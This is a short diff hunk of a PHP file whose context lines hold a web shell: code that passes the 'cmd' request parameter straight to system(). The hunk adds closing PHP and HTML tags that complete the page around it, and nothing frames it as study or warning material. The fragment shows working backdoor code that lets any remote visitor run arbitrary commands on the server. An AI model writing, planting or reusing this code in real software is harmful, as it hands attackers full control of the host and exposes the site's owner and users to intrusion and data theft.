@@ -9,4 +9,7 @@
     if(isset($_GET['cmd']))
     {
         system($_GET['cmd']);
-
+?>
+</pre>
+</body>
+</html>
